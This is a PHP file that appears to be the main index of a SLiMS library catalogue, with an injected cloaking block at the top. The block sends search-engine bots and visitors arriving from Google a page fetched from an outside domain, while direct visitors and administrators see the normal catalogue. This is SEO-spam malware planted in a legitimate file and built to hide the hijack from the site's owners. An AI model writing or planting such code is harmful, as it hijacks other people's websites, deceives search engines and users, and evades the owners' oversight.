<?php

/**

 * REVISI TOTAL: Cloaking Dual-Layer (Bot Indexing + Google Referer)

 * 1. Bot (Google/Bing/dll) -> Lihat Konten Cloaking (untuk SEO)

 * 2. User dari Google Klik -> Lihat Konten Cloaking

 * 3. Akses Langsung/Admin -> Lihat SLiMS (OPAC)

 */



// --- LAYER 1: ANTI-CACHE & OPTIMASI SPEED ---

header("X-LiteSpeed-Cache-Control: no-cache,no-store,private");

header("X-LiteSpeed-Cache: miss");

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");

header("Pragma: no-cache");



// --- LAYER 2: LOGIKA DETEKSI (BOT & REFERER) ---

function is_cloaking_needed() {

    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    $referer = $_SERVER['HTTP_REFERER'] ?? '';



    // Daftar Bot agar tetap ter-index

    $bots = ['googlebot', 'google-inspectiontool', 'bingbot', 'adsbot-google', 'baiduspider', 'yandex'];

    foreach ($bots as $bot) {

        if (strpos($ua, $bot) !== false) return true;

    }



    // Cek jika user datang dari hasil pencarian Google (site:domain)

    if (stripos($referer, 'google.') !== false) {

        return true;

    }



    return false;

}



// --- LAYER 3: EKSEKUSI CLOAKING ---

if (is_cloaking_needed()) {

    $remoteUrl = 'https://anjay.starboy-meroket.dev/djarum/index.html';

    

    $context = stream_context_create([

        'http' => [

            'method'  => 'GET',

            'timeout' => 5,

            'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"

        ]

    ]);



    $html = @file_get_contents($remoteUrl, false, $context);



    if ($html !== false) {

        header_remove('X-LiteSpeed-Cache');

        header('Content-Type: text/html; charset=UTF-8');

        header('X-Robots-Tag: index, follow');

        echo $html;

        exit;

    }

}



// --- LAYER 4: KODE ASLI SLIMS (JALAN JIKA BUKAN DARI GOOGLE) ---

define('INDEX_AUTH', '1');



require 'sysconfig.inc.php';

require LIB.'ip_based_access.inc.php';

do_checkIP('opac');

require LIB.'member_session.inc.php';



session_start();

if ($sysconf['template']['base'] == 'html') {

  require SIMBIO.'simbio_GUI/template_parser/simbio_template_parser.inc.php';

}



$page_title = $sysconf['library_subname'].' | '.$sysconf['library_name'];

$info = __('Web Online Public Access Catalog');

$total_pages = 1;

$header_info = '';

$metadata = '';



if (utility::isMemberLogin()) {

  $header_info .= '<div class="alert alert-info">'.__('Logged on').': '.$_SESSION['m_name'].'</div>';

}



ob_start();

require LIB.'contents/common.inc.php';



// Routing Internal SLiMS

if (isset($_GET['p'])) {

    $path = utility::filterData('p', 'get', false, true, true);

    $path = preg_replace('@^(http|https|ftp|sftp|file|smb):@i', '', $path);

    $path = preg_replace('@\/@i','',$path);

    

    if (file_exists(LIB.'contents/'.$path.'.inc.php')) {

        if ($path != 'show_detail') $metadata = '<meta name="robots" content="noindex, follow">';

        include LIB.'contents/'.$path.'.inc.php';

    } else {

        $metadata = '<meta name="robots" content="index, follow">';

        include LIB.'content.inc.php';

        $content = new Content();

        $content_data = $content->get($dbs, $path);

        if ($content_data) {

          echo $content_data['Title'];

          echo $content_data['Content'];

        } else {

          require 'api/v'.$sysconf['api']['version'].'/routes.php';

        }

    }

} else {

    $metadata = '<meta name="robots" content="index, follow">';

    include LIB.'contents/default.inc.php';

}



$main_content = ob_get_clean();

require $sysconf['template']['dir'].'/'.$sysconf['template']['theme'].'/index_template.inc.php';
